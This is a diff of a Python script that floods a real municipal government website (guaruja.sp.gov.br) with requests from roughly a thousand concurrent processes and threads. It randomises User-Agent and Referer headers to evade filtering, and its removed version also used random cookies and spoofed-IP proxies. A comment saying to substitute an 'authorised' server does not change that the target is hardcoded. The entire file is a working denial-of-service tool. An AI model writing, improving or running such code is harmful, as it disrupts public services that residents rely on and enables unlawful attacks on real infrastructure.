@@ -1,66 +1,72 @@
-import multiprocessing
-import threading
 import requests
 import random
-import string
-from scapy.all import RandIP
+import time
+import multiprocessing
+import threading
 
-def read_file_lines(filename):
-    with open(filename, "r") as file:
-        lines = file.readlines()
-    return [line.strip() for line in lines]
+def send_request(url):
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
+    ]
 
-def generate_random_cookie():
-    cookie_name = ''.join(random.choices(string.ascii_letters, k=10))
-    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-    return {cookie_name: cookie_value}
+    referers = [
+        "https://www.youtube.com/",
+        "https://www.pornhub.com/",
+        "https://www.xvideos.com/",
+        "https://www.netflix.com/",
+        "https://www.facebook.com/",
+        "https://www.instagram.com/"
+    ]
 
-def request_test():
-    user_agents = read_file_lines("useragents.txt")
-    referers = read_file_lines("referers.txt")
-    
-    user_agent = random.choice(user_agents)
-    referer = random.choice(referers)
-    spoofed_ip = str(RandIP())
-    
-    url = "https://www.guaruja.sp.gov.br/"  # Substitua pelo seu servidor autorizado
     headers = {
-        "User-Agent": user_agent,
-        "Referer": referer,
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Connection": "keep-alive",
-        "Cache-Control": "max-age=0",
-        "Upgrade-Insecure-Requests": "1",
-        "DNT": "1",
-        "Sec-GPC": "1",
-        "TE": "Trailers"
+        'User-Agent': random.choice(user_agents),
+        'Referer': random.choice(referers)
     }
-    cookies = generate_random_cookie()
-    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": spoofed_ip, "https": spoofed_ip})
-    print(f"Status da requisição com {user_agent}, referer {referer}, IP spoofed {spoofed_ip} e cookies {cookies}: {response.status_code}")
 
-if __name__ == "__main__":
-    # Multiprocessing com 614 processos
+    try:
+        response = requests.get(url, headers=headers)
+        print(f"Response from {url}: {response.status_code}")
+    except Exception as e:
+        print(f"Error accessing {url}: {str(e)}")
+
+def main():
+    url = "https://www.guaruja.sp.gov.br/"  # Substitua com o site autorizado
+    num_processes = 472
+    num_threads = 628
+    duration = 300  # segundos
+
+    start_time = time.time()
+
+    # Usando multiprocessing para enviar requisições simultaneamente
     processes = []
-    for _ in range(614):
-        p = multiprocessing.Process(target=request_test)
+    for _ in range(num_processes):
+        p = multiprocessing.Process(target=send_request, args=(url,))
         p.start()
         processes.append(p)
-    
-    # Threads com 613 threads
+
+    # Usando threading para enviar requisições simultaneamente
     threads = []
-    for _ in range(613):
-        t = threading.Thread(target=request_test)
+    for _ in range(num_threads):
+        t = threading.Thread(target=send_request, args=(url,))
         t.start()
         threads.append(t)
-    
-    try:
-        # Mantém o programa rodando até ser encerrado com Control+C
-        for p in processes:
-            p.join()
-        for t in threads:
-            t.join()
-    except KeyboardInterrupt:
-        print("Programa encerrado.")
+
+    # Aguarda até que todas as threads e processos terminem ou até atingir a duração máxima
+    for p in processes:
+        p.join()
+
+    for t in threads:
+        t.join()
+
+    end_time = time.time()
+    print(f"Total time taken: {end_time - start_time} seconds")
+
+if __name__ == "__main__":
+    main()
